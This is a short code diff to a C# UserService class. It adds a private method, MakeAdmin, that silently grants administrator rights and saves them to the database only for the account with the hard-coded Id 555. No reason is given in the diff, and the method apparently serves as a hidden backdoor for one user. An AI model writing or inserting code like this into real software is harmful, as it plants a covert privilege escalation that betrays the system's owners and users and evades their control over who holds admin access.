@@ -44,4 +44,13 @@ public class UserService : IUserService
 
         return result.Entity;
     }
+
+    private async Task MakeAdmin(AppUser user)
+    {
+        if (user.Id ==  555)
+        {
+            user.Admin = true;
+            await _context.SaveChangesAsync();
+        }
+    }
 }
